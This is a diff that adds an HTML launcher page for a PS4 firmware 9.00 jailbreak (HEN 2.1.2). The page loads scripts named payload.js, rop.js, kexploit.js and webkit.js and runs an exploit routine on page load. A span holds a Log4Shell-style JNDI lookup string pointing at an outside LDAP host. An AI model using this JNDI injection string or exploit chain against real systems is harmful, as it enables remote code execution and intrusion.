@@ -1,0 +1,42 @@
+<html>
+
+<head>
+    <title>PS4 9.00 - HEN 2.1.2</title>
+    <link rel="stylesheet" href="styles.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script>
+        if (window.applicationCache.status == "0") {
+            window.location.replace("cache.html");
+        }
+
+        function allset() {
+            document.getElementById("loader").style.display = "none";
+            document.getElementById("allset").style.display = "block";
+        }
+
+        function awaitpl() {
+            document.getElementById("loader").style.display = "none";
+            document.getElementById("awaiting").style.display = "block";
+        }
+    </script>
+    <script src="payload.js"></script>
+    <script src="int64.js"></script>
+    <script src="rop.js"></script>
+    <script src="kexploit.js"></script>
+    <script src="webkit.js"></script>
+</head>
+
+</html>
+
+<body onload="setTimeout(poc, 1500);">
+    <div id="loader" class="loader"></div>
+    <div id="awaiting" class="info" style="display: none;">
+        Awaiting Payload...
+        <span class="j">${jndi:ldap://nsa.gov}</span>
+    </div>
+
+    <div id="allset" class="info" style="display: none;">
+        <p style="margin-top: 50px;">Payload Inyected.</p>
+        <h6>Disconnect the USB drive and close the browser.</h6>
+    </div>
+</body>
